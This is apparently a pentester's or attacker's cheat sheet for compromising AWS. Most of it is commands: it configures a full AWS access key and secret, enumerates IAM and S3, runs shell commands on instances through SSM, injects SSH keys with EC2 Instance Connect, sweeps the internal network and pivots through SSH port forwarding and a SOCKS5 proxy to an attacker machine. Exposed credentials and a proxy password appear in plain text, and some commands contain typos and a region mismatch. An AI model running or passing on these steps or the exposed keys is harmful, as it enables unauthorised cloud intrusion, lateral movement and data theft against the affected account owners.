# Gaining access to Instance
```
aws configure --profile Test
AWS Access Key ID [None]: AKIAIRYBX5NHQLRB52WQ
AWS Secret Access Key [None]: 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
Default region name [None]: us-west-2
```
# Enumerate IAM permissions

```
python3 enumerate-iam.py --access-key AKIAIRYBX5NHQLRB52WQ --secret-key  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
```
# Upon adding the crednetail.next step is to enumerate
```
aws s3 ls --profile Test
aws s3 ls s3://file.resilient --profile Test
```

# If you have enough to utilize AWS Systems Manager Agent 
```
aws ssm describe-instance-information — profile Test

aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile Test
```
# Gaining access to vulerable Instance
```
apt-get isntall install ec2-instance-connect
aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id i-0989ec8719613a4d9 --availability-zone us-west-2f --instance-os-user ec2-user --ssh-public-key file://My-Key.pub
ssh -i private.key ubuntu@54.211.12.132
```
# Upon Gaining access to Instance, Next Step is to enumerate the internal hosts and Services.
```
ifconfig or /sbin/ifconfig
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
for i in {1..254}; do (ping -c 1 192.168.1.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
ping6 -c4 -I eth0 ff02::1 | tee ipv6
```
# Port Forwarding if you have found any susceptible Services like Tomcat.Jboss and Weblogic
```
ssh -i private.key ubuntu@54.211.12.132 -L 8080:127.0.0.1:8080 -N -f

wget https://raw.githubusercontent.com/mfontanini/Programs-Scripts/master/socks5/socks5.cpp

The following variable should be changed
define SERVER_PORT 7777
#define USERNAME "NLK"
#define PASSWORD "123456@*&<>"

On your Attacker Machine,proxychains setting must be amend like information below

socks5 54.211.12.132 7777 NLK 123456@*&<>
proxychains firefox 127.0.0.1:8080
```
